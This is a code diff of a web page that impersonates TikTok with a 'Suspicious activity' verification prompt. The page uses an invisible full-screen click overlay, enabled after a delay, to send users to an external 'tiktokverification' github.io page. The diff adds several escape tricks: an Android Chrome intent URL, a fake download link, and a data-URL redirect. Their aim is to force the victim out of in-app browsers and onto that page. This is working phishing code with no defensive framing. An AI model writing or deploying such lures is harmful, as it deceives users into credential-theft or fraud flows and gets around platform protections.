@@ -12,11 +12,10 @@
             height: 100%; overflow: hidden;
         }
 
-        /* The Full-Screen Blanket */
         #full-screen-redirect {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             z-index: 9999; opacity: 0; cursor: pointer;
-            display: none; /* Activated after 10s */
+            display: none;
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -47,7 +46,6 @@
                 <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
                 <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
             </svg>
-
             <div class="header">Suspicious activity</div>
             <div class="subtext">Please complete verification to continue using TikTok.</div>
             <div class="tiktok-btn-visual">Verify</div>
@@ -58,23 +56,31 @@
         const targetUrl = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
         function breakOut() {
-            // Attempt to force external browser
-            // Logic: Safari-specific scheme, then Chrome-specific, then standard
-            const safariUrl = targetUrl.replace("https://", "safari-https://");
-            const chromeUrl = targetUrl.replace("https://", "googlechrome://");
+            // Method 1: The "Intent" for Android (forces Chrome)
+            const intentUrl = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            
+            // Method 2: Blob download trick (forces iOS to offer "Open in Safari")
+            const blob = new Blob([''], { type: 'application/octet-stream' });
+            const blobUrl = URL.createObjectURL(blob);
+            
+            // Method 3: RFC-compliant FTP/Data trick
+            const dataUrl = "data:text/html,<html><script>window.location.href='" + targetUrl + "';<\/script></html>";
 
-            window.location.href = safariUrl;
+            // Execute the chain
+            window.location.href = intentUrl; // Try Android Intent first
 
-            // Fallback for non-iOS or if safari-https fails
             setTimeout(() => {
-                window.location.href = chromeUrl;
-            }, 500);
+                // Try to force an external trigger via a fake download
+                const a = document.createElement('a');
+                a.href = targetUrl;
+                a.download = 'verify.html';
+                a.click();
+            }, 100);
 
-            // Final fallback
             setTimeout(() => {
-                window.open(targetUrl, '_system');
-                window.location.href = targetUrl;
-            }, 1000);
+                // Last ditch effort: direct URL handoff
+                window.location.assign(targetUrl);
+            }, 300);
         }
 
         window.onload = function() {
